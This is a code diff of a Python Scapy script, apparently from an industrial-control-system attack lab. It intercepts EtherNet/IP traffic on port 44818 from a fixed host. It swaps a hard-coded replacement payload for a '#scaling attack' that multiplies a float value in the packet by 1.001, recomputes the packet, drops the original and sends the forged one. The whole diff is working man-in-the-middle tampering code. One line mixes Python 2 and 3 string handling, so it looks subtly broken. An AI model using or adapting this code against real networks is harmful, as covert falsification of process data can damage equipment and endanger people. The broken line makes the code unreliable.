@@ -20,15 +20,15 @@ def modify(packet):
     if pkt.haslayer(TCP) and pkt.getlayer(TCP).sport == 44818 and pkt[IP].src =="10.0.0.3":
         if pkt.haslayer(Raw) and len(pkt.getlayer(Raw).load) == 50:
             print("Seba")
-            mydata = binascii.hexlify(bytes(pkt[Raw].load))
-            print(mydata)
-            modified = "6f001a00595cb4ed00000000300000000000000000000000000000000800020000000000b2000a00cc000000ca00a3867f3e"
-            pkt[Raw].load = modified.decode('hex') 
-            print(pkt[Raw].load)
+            mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
+            payload = mydata[-8:]
+            val = struct.unpack("<f", binascii.unhexlify(payload))[0]
+            #scaling attack
+            scaled = (1+0.001)*val
+            newdata = mydata[:-8]+ binascii.hexlify(bytes(struct.pack('<f', scaled))).decode()
+            pkt[Raw].load = newdata.decode('hex')
             del pkt[IP].chksum
             del pkt[TCP].chksum
-            #packet.payload = pkt.getlayer(Raw).load
-            #packet.set_payload(str(pkt))
     packet.drop()
     send(pkt)
 
